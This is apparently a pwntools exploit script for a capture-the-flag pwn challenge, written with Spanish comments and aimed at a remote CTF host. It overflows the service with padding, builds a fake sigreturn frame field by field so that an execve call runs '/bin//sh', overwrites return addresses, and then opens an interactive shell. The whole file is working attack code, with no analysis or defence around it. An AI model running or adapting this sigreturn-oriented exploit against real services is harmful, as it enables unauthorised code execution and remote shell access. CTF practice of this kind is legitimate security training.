#!/usr/bin/env python3                                                          
import struct
from pwn import *


context(os='linux', arch='amd64')
context.terminal = ["terminator", "-e"]
#context.log_level = "debug"

#p = process('./main')

p = remote("challs.xmas.htsp.ro",2002)
#p = remote("127.0.0.1",3000)

if args.GDB:
    gdb.attach(p,'''c
    unset environment''')

#Variables globales

# offset 8189; la mitad 4093
buffer = b"A"*8

#sled = b"\x10\x73\xfe\xff\xff\x7f\x00\x00"
#0x00007ffffffde000 0x00007ffffffff000 21000 (135168)
#En este rango el rsp: 0xfde000 - 0xfff000
#Tienes que sumarle al rsp como mínimo 0xbff0
#sled = struct.pack('<Q', 0x00007fffffff20f0)    
#sled = struct.pack('<Q', 0x00007ffffffe9ff0) 
sled = b"A"*8
#sled = struct.pack('<Q', 0x00007fffffff5fe0) 

def main():

    send_padding()
    create_frame()
    #send_frame()
    send_return()
    send_read()
    #pause()
    send_quit()
    send_sh()
    p.interactive()


def send_read():

    #0x00007ffffffe5928
    ret = b"\x28\x59\xfe\xff\xff\x7f\x00\x00" 
    p.recv(timeout=0.1)
    p.send(ret)
    p.clean(timeout=0.1)


    ret = b"\x16\x11\x40\x00\x00\x00\x00\x00" 
    p.recv(timeout=0.1)
    p.send(ret)
    p.clean(timeout=0.1)



def send_sh():

    #ret = b"\x00\x2f\x62\x69\x6e\x2f\x73\x68"
    ret = b"/bin//sh"
    p.recv(timeout=0.1)
    p.send(ret)
    p.clean(timeout=0.1)


def send_return():

    # 0x7ffffffe5940:
    # 0x0000000000401195
    # br *0x401140
    # 0x7ffffffe58f0
    # 0x7ffffffe59f8
    # 0x7fffffff5828 - 0x7ffffffe5938 = fef0 (65264) veces escribo NOP's
    # 0x00007ffffffff000 - 0x00007ffffffde000 = 21000 (135168) tamaño de la pila
    # 0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rwx [stack]
    # \x00\xe0\xfd\xff\xff\x7f\x00\x00  --- \x00\xf0\xff\xff\xff\x7f\x00\x00
    # 7FFF FFFE F110  \x10\xf1\xfe\xff\xff\x7f\x00\x00
    #ret = b"\x08\x67\xfe\xff\xff\x7f\x00\x00" 
    #ret = b"\x08\x70\xfe\xff\xff\x7f\x00\x00" 
    ret = b"\x96\x11\x40\x00\x00\x00\x00\x00" 
    p.recv(timeout=0.1)
    p.send(ret)
    p.clean(timeout=0.1)


def send_quit():

    end = b"/quit"
    p.recv(timeout=0.1)
    p.send(end)
    p.clean(timeout=0.1)

def send_padding():

    for i in range(8154):
        #log.info("Step %s" %i)
        #p.recv(timeout=0.01)
        p.send(buffer)

    p.recv(timeout=5)
    p.clean(timeout=1.5)


def send_frame():

    frame = SigreturnFrame(arch="amd64", kernel="amd64")
    frame.rax = 0x000000000000003b
    frame.rdi = 0x0000000000402000
    frame.rsi = 0
    frame.rdx = 0
    frame.rsp = 0x00007ffffffe7008
    frame.rbp = 0x00007ffffffe7008
    frame.rip = 0x000000000040119f

    info = [frame[i:i+8] for i in range(0, len(frame), 8)]
    print (info)
    p.recv(timeout=0.1)
    p.send(frame)
    p.clean(timeout=0.1)

def create_frame():

    log.info("Creating fake SigreturnFrame...")

    '''
    #sigcontext structure (32)
    pause()
    frame = SigreturnFrame(kernel="amd64") # CREATING A SIGRETURN FRAME
    frame.rax = 10 # MPROTECT SYSCALL
    frame.rdi = p64(0x7ffffffde000) # base address
    frame.rsi = 1000 # size
    frame.rdx = 7 # SET RDX => RWX PERMISSION
    #frame.rsp = shellcode_addr + len(payload) + 248 # WHERE 248 IS SIZE OF FAKE FRAME!
    #frame.rip = syscall_ret # SET RIP TO SYSCALL ADDRESS
    '''

    #The sigcontext structure length is 248 Bytes
    #1023-248 = 775
    #1023-31(31 inserciones de 8bytes - fake sigcontext structure) = 992


    frame30 = struct.pack('<Q', 0x0000000000000000)    # uc_sigmask 
    p.recv(timeout=0.1)
    p.send(frame30)
    p.clean(timeout=0.1)

    frame29 = struct.pack('<Q', 0x0000000000000000)    # reserved
    p.recv(timeout=0.1)
    p.send(frame29)
    p.clean(timeout=0.1)

    frame28 = struct.pack('<Q', 0x0000000000000000)    # fpstate = NULL  
    p.recv(timeout=0.1)
    p.send(frame28)
    p.clean(timeout=0.1)

    frame27 = struct.pack('<Q', 0x0000000000000000)    # CR2 
    p.recv(timeout=0.1)
    p.send(frame27)
    p.clean(timeout=0.1)

    frame26 = struct.pack('<Q', 0x0000000000000000)    # Old-Mask
    p.recv(timeout=0.1)
    p.send(frame26)
    p.clean(timeout=0.1)

    frame25 = struct.pack('<Q', 0x0000000000000001)    # TrapNo
    p.recv(timeout=0.1)
    p.send(frame25)
    p.clean(timeout=0.1)

    frame24 = struct.pack('<Q', 0x0000000000000000)    # ERR
    p.recv(timeout=0.1)
    p.send(frame24)
    p.clean(timeout=0.1)

    frame23 = struct.pack('<Q', 0x002b000000000033)    # Segment Registers(SS, FS, GS, CS)
    p.recv(timeout=0.1)
    p.send(frame23)
    p.clean(timeout=0.1)

    frame22 = struct.pack('<Q', 0x0000000000000202)    # EFLAGS - Some value
    p.recv(timeout=0.1)
    p.send(frame22)
    p.clean(timeout=0.1)

    frame21 = struct.pack('<Q', 0x000000000040119f)    # RIP = should call 'syscall' instruction
    p.recv(timeout=0.1)
    p.send(frame21)
    p.clean(timeout=0.1)

    #b"\x08\x70\xfe\xff\xff\x7f\x00\x00"
    frame20 = struct.pack('<Q', 0x00007ffffffe7008)    # RSP  
    p.recv(timeout=0.1)
    p.send(frame20)
    p.clean(timeout=0.1)

    frame19 = struct.pack('<Q', 0xdeadbeefdeadbeef)    # RCX 
    p.recv(timeout=0.1)
    p.send(frame19)
    p.clean(timeout=0.1)

    frame18 = struct.pack('<Q', 0x000000000000003b)    # RAX = system call number = 59
    p.recv(timeout=0.1)
    p.send(frame18)
    p.clean(timeout=0.1)

    frame17 = struct.pack('<Q', 0x0000000000000000)    # RDX
    p.recv(timeout=0.1)
    p.send(frame17)
    p.clean(timeout=0.1)

    frame16 = struct.pack('<Q', 0xdeadbeefdeadbeef)    # RBX
    p.recv(timeout=0.1)
    p.send(frame16)
    p.clean(timeout=0.1)

    frame15 = struct.pack('<Q', 0x00007ffffffe7008)   # RBP
    p.recv(timeout=0.1)
    p.send(frame15)
    p.clean(timeout=0.1)

    # Tamaño pila: 1000 = 0x3e8 or 10000 = 0x2710 or 135.168 = 0x21000
    #frame14 = b"\x2f\x62\x69\x6e\x2f\x73\x68\x0a"
    #frame14 = struct.pack('<Q', 0x68732f2f6e69622f)    # RSI
    frame14 = struct.pack('<Q', 0x0000000000000000)    # RSI
    p.recv(timeout=0.1)
    p.send(frame14)
    p.clean(timeout=0.1)

    frame13 = struct.pack('<Q', 0x0000000000402000)    # RDI
    p.recv(timeout=0.1)
    p.send(frame13)
    p.clean(timeout=0.1)

    frame12 = struct.pack('<Q', 0xdeadbeefdeadbeef)    # R15
    p.recv(timeout=0.1)
    p.send(frame12)
    p.clean(timeout=0.1)

    frame11 = struct.pack('<Q', 0xdeadbeefdeadbeef)    # R14
    p.recv(timeout=0.1)
    p.send(frame11)
    p.clean(timeout=0.1)

    frame10 = struct.pack('<Q', 0xdeadbeefdeadbeef)    # R13 
    p.recv(timeout=0.1)
    p.send(frame10)
    p.clean(timeout=0.1)

    frame09 = struct.pack('<Q', 0xdeadbeefdeadbeef)    # R12
    p.recv(timeout=0.1)
    p.send(frame09)
    p.clean(timeout=0.1)

    frame08 = struct.pack('<Q', 0xdeadbeefdeadbeef)    # R11
    p.recv(timeout=0.1)
    p.send(frame08)
    p.clean(timeout=0.1)

    frame07 = struct.pack('<Q', 0xdeadbeefdeadbeef)    # R10
    p.recv(timeout=0.1)
    p.send(frame07)
    p.clean(timeout=0.1)

    frame06 = struct.pack('<Q', 0xdeadbeefdeadbeef)    # R9
    p.recv(timeout=0.1)
    p.send(frame06)
    p.clean(timeout=0.1)

    frame05 = struct.pack('<Q', 0xdeadbeefdeadbeef)    # R8
    p.recv(timeout=0.1)
    p.send(frame05)
    p.clean(timeout=0.1)

    frame04 = struct.pack('<Q', 0x0000000000000000)    # uc_stack.ss_size
    p.recv(timeout=0.1)
    p.send(frame04)
    p.clean(timeout=0.1)

    frame03 = struct.pack('<Q', 0x00007fff00000002)    # uc_stack.ss_flags 
    p.recv(timeout=0.1)
    p.send(frame03)
    p.clean(timeout=0.1)

    frame02 = struct.pack('<Q', 0x0000000000000000)    # uc_stack.ss_sp
    p.recv(timeout=0.1)
    p.send(frame02)
    p.clean(timeout=0.1)

    frame01 = struct.pack('<Q', 0x0000000000000000)    # uc_link 
    p.recv(timeout=0.1)
    p.send(frame01)
    p.clean(timeout=0.1)

    frame00 = struct.pack('<Q', 0x0000000000000007)    # uc_flags
    p.recv(timeout=0.1)
    p.send(frame00)
    p.clean(timeout=0.1)


if __name__ == '__main__':
    
    main()


